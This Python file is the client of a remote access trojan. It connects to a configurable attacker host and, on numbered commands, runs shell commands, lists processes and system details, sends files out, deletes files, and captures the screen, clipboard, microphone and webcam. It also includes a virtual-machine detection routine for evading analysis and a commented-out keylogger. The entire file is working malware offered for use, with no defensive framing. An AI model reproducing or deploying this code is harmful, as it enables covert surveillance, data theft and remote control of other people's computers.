import socket
import cv2
import struct
import pickle
import subprocess
import pyperclip
import os
import sounddevice as sd
from scipy.io.wavfile import write
import imutils
import platform
import pyscreenshot as ImageGrab
# from pynput.keyboard import Listener, Key


# SERVER = socket.gethostbyname_ex(socket.gethostname())[-1][-1]  # The server's hostname or IP address
SERVER = ""    # write host ip

PORT = 8888      # The port used by the server

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER, PORT))

platform = platform.system()


def vm_detect():
    if platform.system() == 'Windows':
        if ('\n0' in subprocess.getoutput('WMIC BIOS GET SERIALNUMBER')
            or 'innotek GmbH' in subprocess.getoutput('WMIC COMPUTERSYSTEM GET MODEL')
            or 'VirtualBox' in subprocess.getoutput('WMIC COMPUTERSYSTEM GET MANUFACTURER')): return True
        else:
            return False
    elif platform.system() == 'Linux':
        if subprocess.getoutput('systemd-detect-virt') == 'none':
            return False
        else:
            return True

# for keylogger


def process_discovery():
    cmd = ''
    if platform == 'Windows':
        cmd = 'tasklist'
    if platform == 'Linux':
        cmd = 'ps aux'
    tasklist = subprocess.getoutput(cmd)
    print(tasklist)
    client.sendall(tasklist.encode())


def command_line_interface():
    command = client.recv(1024).decode()
    if platform == 'Windows':
        status, result = subprocess.getstatusoutput(command)
        if status == 0 and result == "":
            client.send(b"done")
        else:
            print(status, result)
            client.send(result.encode())
    if platform == 'Linux':
        status, result = subprocess.getstatusoutput(command)
        if status == 0 and result == "":
            client.send(b"done")
        else:
            print(status, result)
            client.send(result.encode())


def system_information_discovery():
    # systeminfo = subprocess.check_output('systeminfo', shell=True, universal_newlines=True)
    cmd = ''
    if platform == 'Windows':
        cmd = 'systeminfo'
    if platform == 'Linux':
        print(platform)
        cmd = 'uname -a ; lscpu'
    systeminfo = subprocess.getoutput(cmd)
    client.sendall(systeminfo.encode())


def file_and_directory_discovery():
    dir = client.recv(2048).decode()
    if os.path.exists(dir):
        cmd = ''
        if platform == 'Windows':
            cmd = "dir " + dir
        if platform == 'Linux':
            cmd = "ls -l " + dir
        command = subprocess.getoutput(cmd)
        client.sendall(command.encode())
    else:
        client.send(b"Error")
    # client.send(b'!done')


def remote_file_copy():
    filename = client.recv(2048).decode()
    if os.path.exists(filename):
        with open(filename, 'rb') as f:
            for i in f:
                client.sendall(i)
    else:
        client.send(b"Error")


def file_deletion():
    file = client.recv(2048).decode()
    if os.path.exists(file):
        os.remove(file)
        client.send(b'Done')
    else:
        client.send(b'Error')


def screen_capture():
    im = ImageGrab.grab()

    # save image file
    im.save("screenshot.png")
    file = open("screenshot.png", "rb")
    for i in file:
        client.send(i)
    client.send(b' done')
    file.close()
    os.remove('screenshot.png')


def clipboard_data():
    msg = pyperclip.paste()
    print(msg)
    client.sendall(msg.encode())
    # client.send(b'!done')


def audio_capture():
    freq = 44100

    # Recording duration
    duration = 5

    # Start recorder with the given values
    # of duration and sample frequency
    recording = sd.rec(int(duration * freq),
                       samplerate=freq, channels=2)

    # Record audio for the given number of seconds
    sd.wait()
    # This will convert the NumPy array to an audio
    # file with the given sampling frequency
    write("recording0.wav", freq, recording)
    with open('recording0.wav', 'rb') as f:
        print(os.path.getsize('recording0.wav'))
        for i in f:
            client.sendall(i)
    client.send(b'!done')
    # print("s")
    os.remove('recording0.wav')


def video_capture():
    vid = cv2.VideoCapture(1)
    # if vid is None or not vid.isOpened():
    #     vid = cv2.VideoCapture('C:\\Users\\Konstantin\\Downloads\\video.mp4')

    while vid.isOpened():
        img, frame = vid.read()
        frame = imutils.resize(frame, width=700)
        a = pickle.dumps(frame)
        message = struct.pack("Q", len(a)) + a
        client.sendall(message)
        key = cv2.waitKey(1) & 0xFF
        if key == ord("q"):
            client.send(b"q")
            break


count = 0
text = ''


# def press(key):
#     global count, text
#     if key == Key.enter:
#         text += "\n"
#     elif key == Key.tab:
#         text += "\t"
#     elif key == Key.space:
#         text += "space"
#     elif key == Key.shift:
#         text += "shift"
#     elif key == Key.ctrl_l or key == Key.ctrl_r:
#         text += "ctrl"
#     elif key == Key.esc:
#         text += "esc"
#     else:
#         text += str(key)
#     count += 1
#     print(key)
#     if count == 20:
#         client.send(text.encode())
#         client.send(b"done")
#         return False


# def input_capture():
#     with Listener(on_press=press) as listener:
#         listener.join()


while True:
    # if not vm_detect():
    #     client.close()
    msg = client.recv(1024).decode("utf-8")
    if msg == "1":
        # input_capture()
        pass
    if msg == "2":
        process_discovery()
    if msg == "3":
        command_line_interface()
    if msg == "4":
        system_information_discovery()
    if msg == "5":
        file_and_directory_discovery()
    if msg == "6":
        remote_file_copy()
    if msg == "7":
        file_deletion()
    if msg == "8":
        screen_capture()
    if msg == "9":
        clipboard_data()
    if msg == "10":
        audio_capture()
    if msg == "11":
        video_capture()


